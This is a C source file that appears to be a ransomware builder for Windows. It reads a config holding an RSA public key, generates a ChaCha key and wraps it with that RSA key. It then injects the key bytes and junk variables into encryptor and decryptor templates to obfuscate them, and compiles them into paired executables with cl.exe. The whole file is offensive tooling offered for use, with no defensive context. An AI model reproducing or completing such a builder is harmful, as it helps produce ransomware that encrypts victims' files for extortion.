#include <windows.h>
#include <stdio.h>
#include "crypto.h"
#include "utils.h"
#include "config.h"

#define MAX_CODE_SIZE 1024 * 1024

char* load_file(const char* filename) {
    printf("Trying to load %s\n", filename);
    HANDLE hFile = CreateFileA(filename, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open %s, error code: %lu\n", filename, GetLastError());
        return NULL;
    }

    DWORD size = GetFileSize(hFile, NULL);
    char* buffer = (char*)HeapAlloc(GetProcessHeap(), 0, size + 1);
    DWORD bytesRead;
    ReadFile(hFile, buffer, size, &bytesRead, NULL);
    buffer[size] = '\0';
    CloseHandle(hFile);
    return buffer;
}

void obfuscate_code(char* code, const BYTE* chacha_key, const BYTE* key_hash) {
    char key_str[256], hash_str[256];
    sprintf_s(key_str, sizeof(key_str), "static BYTE chacha_key[32] = {%u", chacha_key[0]);
    sprintf_s(hash_str, sizeof(hash_str), "static BYTE key_hash[32] = {%u", key_hash[0]);
    for (int i = 1; i < 32; i++) {
        sprintf_s(key_str + strlen(key_str), sizeof(key_str) - strlen(key_str), ", %u", chacha_key[i]);
        sprintf_s(hash_str + strlen(hash_str), sizeof(hash_str) - strlen(hash_str), ", %u", key_hash[i]);
    }
    strcat_s(key_str, sizeof(key_str), "};");
    strcat_s(hash_str, sizeof(hash_str), "};");
    strcat_s(code, MAX_CODE_SIZE, key_str);
    strcat_s(code, MAX_CODE_SIZE, hash_str);

    for (int i = 0; i < 10; i++) {
        char junk[32];
        sprintf_s(junk, sizeof(junk), "int junk%d = %d;", i, rand());
        strcat_s(code, MAX_CODE_SIZE, junk);
    }
}

void compile_to_exe(const char* code, const char* output) {
    char cmd[512];
    sprintf_s(cmd, sizeof(cmd), "echo %s > temp.c && cl.exe /O1 /Fe%s temp.c", code, output);
    system(cmd);
}

int main() {
    MessageBoxA(NULL, "Builder is starting", "Debug", MB_OK); // Всплывающее окно
    printf("Starting builder...\n");
    char* config_json = load_file("cfg.txt");
    if (!config_json) {
        printf("Error loading config\n");
        return 1;
    }
    printf("Config loaded\n");

    Config config = parse_config(config_json);
    printf("Config parsed\n");

    BYTE chacha_key[32];
    generate_random(chacha_key, 32);
    BYTE key_hash[32];
    sha256_hash(chacha_key, sizeof(chacha_key), key_hash);

    BYTE encrypted_key[256];
    rsa_encrypt(chacha_key, 32, encrypted_key, config.rsa_pub_key);

    char* enc_template = load_file("src/encryptor.c");
    if (!enc_template) {
        printf("Error loading encryptor.c\n");
        HeapFree(GetProcessHeap(), 0, config_json);
        free_config(&config);
        return 1;
    }
    printf("Encryptor template loaded\n");

    char* dec_template = load_file("src/decryptor.c");
    if (!dec_template) {
        printf("Error loading decryptor.c\n");
        HeapFree(GetProcessHeap(), 0, config_json);
        HeapFree(GetProcessHeap(), 0, enc_template);
        free_config(&config);
        return 1;
    }
    printf("Decryptor template loaded\n");

    obfuscate_code(enc_template, chacha_key, key_hash);
    obfuscate_code(dec_template, chacha_key, key_hash);

    compile_to_exe(enc_template, "output/encryptor.exe");
    compile_to_exe(dec_template, "output/decryptor.exe");

    char password[65];
    generate_password(password, 64);
    printf("Generated password: %s\n", password);

    HeapFree(GetProcessHeap(), 0, config_json);
    HeapFree(GetProcessHeap(), 0, enc_template);
    HeapFree(GetProcessHeap(), 0, dec_template);
    free_config(&config);
    printf("Builder finished\n");
    return 0;
}